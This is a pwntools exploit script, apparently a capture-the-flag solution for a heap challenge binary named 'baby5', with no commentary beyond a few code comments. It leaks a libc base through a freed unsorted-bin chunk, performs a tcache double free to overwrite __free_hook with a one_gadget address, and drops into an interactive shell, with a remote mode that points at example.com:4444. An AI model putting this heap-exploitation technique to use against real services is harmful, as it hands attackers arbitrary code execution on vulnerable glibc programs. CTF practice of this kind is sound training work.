#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./baby5"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
        loadsym
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def add(size, buf):
    p.recvuntil(">")
    p.sendline(b"1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(buf)

def edit(idx, size, buf):
    p.recvuntil(">")
    p.sendline(b"2")
    p.recvuntil(":")
    p.sendline(str(idx))
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(buf)

def delete(idx):
    p.recvuntil(">")
    p.sendline(b"3")
    p.recvuntil(":")
    p.sendline(str(idx))

def show(idx):
    p.recvuntil(">")
    p.sendline(b"4")
    p.recvuntil(":")
    p.sendline(str(idx))

# libc leak
add(0x20, 'DUMMY')
add(0x500, 'UNSORTED')
add(0x100, 'DUMMY')
delete(1)
show(1)
p.recvuntil("data: ")
main_arena_addr = u64(p.recv()[:6]+b"\00\00")
log.info("main_arena@libc: 0x{:08x}".format(main_arena_addr))
libc_base = main_arena_addr - 0x3ebca0
log.info("libc_base: 0x{:08x}".format(libc_base))
# exec One-Gadget
one_gadget_offset = 0x4f322
one_gadget_addr = libc_base + one_gadget_offset
log.info("One-Gadget@libc: 0x{:08x}".format(one_gadget_addr))
p.sendline("5")
delete(2)
delete(2)
add(0x100, p64(libc.symbols['__free_hook']+libc_base))
add(0x100, 'DUMMY')
add(0x100, p64(one_gadget_addr))
delete(0)

p.interactive()
